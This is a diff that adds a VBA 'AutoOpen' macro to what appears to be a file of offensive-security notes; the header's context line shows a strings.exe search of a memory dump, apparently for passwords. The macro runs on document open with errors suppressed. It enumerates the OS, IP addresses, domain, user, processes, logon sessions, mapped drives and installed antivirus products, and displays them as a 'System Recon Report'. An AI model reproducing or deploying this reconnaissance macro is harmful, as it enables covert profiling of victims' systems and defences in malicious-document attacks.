@@ -350,3 +350,71 @@ strings.exe -nobanner -accepteula -q -o path\to\dumpfile.dmp | findstr /i /c:"pa
 
 
 
+Sub AutoOpen()
+    On Error Resume Next
+    
+    Dim objWMI As Object
+    Dim colItems As Object
+    Dim objItem As Object
+    Dim output As String
+    
+    ' WMI Setup
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    
+    ' Collect OS Info
+    Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
+    For Each objItem In colItems
+        output = output & "OS: " & objItem.Caption & vbCrLf
+        output = output & "Version: " & objItem.Version & vbCrLf
+        output = output & "Architecture: " & objItem.OSArchitecture & vbCrLf
+        output = output & "Build Number: " & objItem.BuildNumber & vbCrLf
+    Next
+    
+    ' Collect IP Info
+    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")
+    For Each objItem In colItems
+        output = output & "IP Address: " & objItem.IPAddress(0) & vbCrLf
+    Next
+    
+    ' Collect Domain Info
+    Set colItems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
+    For Each objItem In colItems
+        output = output & "Computer Name: " & objItem.Name & vbCrLf
+        output = output & "Domain: " & objItem.Domain & vbCrLf
+        output = output & "User: " & objItem.UserName & vbCrLf
+    Next
+    
+    ' Collect Process List
+    Set colItems = objWMI.ExecQuery("Select * from Win32_Process")
+    output = output & "Running Processes:" & vbCrLf
+    For Each objItem In colItems
+        output = output & objItem.Name & vbCrLf
+    Next
+    
+    ' Collect Logged On Users (Live Sessions)
+    Set colItems = objWMI.ExecQuery("Select * from Win32_LogonSession")
+    output = output & "Logged On Sessions:" & vbCrLf
+    For Each objItem In colItems
+        output = output & "LogonId: " & objItem.LogonId & ", Type: " & objItem.LogonType & vbCrLf
+    Next
+    
+    ' Collect Mapped Drives
+    Set colItems = objWMI.ExecQuery("Select * from Win32_LogicalDisk WHERE DriveType = 4")
+    output = output & "Mapped Drives:" & vbCrLf
+    For Each objItem In colItems
+        output = output & objItem.DeviceID & " - " & objItem.ProviderName & vbCrLf
+    Next
+
+    ' Collect AV/Security Products
+    Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
+    Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
+    output = output & "Detected Security Products:" & vbCrLf
+    For Each objItem In colItems
+        output = output & objItem.displayName & vbCrLf
+    Next
+
+    ' Display or store the output
+    MsgBox Left(output, 30000), vbInformation, "System Recon Report"
+End Sub
+
+
